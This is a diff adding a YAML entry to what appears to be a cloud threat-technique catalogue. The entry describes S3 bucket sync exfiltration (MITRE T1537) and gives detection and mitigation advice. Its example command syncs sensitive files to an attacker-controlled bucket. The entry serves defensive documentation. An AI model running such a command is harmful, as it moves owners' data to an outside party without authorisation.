@@ -1,0 +1,22 @@
+Category: Data Exfiltration
+Command: aws s3 sync
+Detection:
+- Monitor S3 access logs for unexpected data transfers to external buckets.
+Example:
+- Command: aws s3 sync /path/to/sensitive/data s3://attacker-bucket
+  Output: Files uploaded to S3
+MITRE_ATT&CK: T1537
+Service: AWS S3
+description: Syncs sensitive data to an attacker-controlled S3 bucket for exfiltration.
+impact:
+- data exfiltration
+mitigation: Enforce bucket policies to restrict access. Use VPC endpoints to limit
+  S3 traffic.
+name: S3 Bucket Sync
+references:
+- https://docs.aws.amazon.com/cli/latest/reference/s3/sync.html
+tags:
+- data-exfiltration
+- s3
+- sync
+- T1537
